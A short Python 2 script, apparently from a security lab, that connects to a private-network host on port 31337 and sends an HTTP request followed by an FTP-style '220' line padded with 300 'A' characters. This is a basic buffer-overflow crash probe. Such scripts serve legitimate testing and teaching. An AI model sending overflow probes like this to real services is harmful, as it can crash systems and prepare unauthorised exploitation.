#06-20-2020 DC:  This is a client, not a server.  



#!/usr/bin/python
 
import socket

target_host = "10.0.2.7"
target_port = 31337
payload = "A" * 300

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

client.send("GET / HTTP/1.0\r\nHOST: 10.0.2.7\r\n\r\n")
client.send("220 " + payload + "\r\n")

response = client.recv(4096)
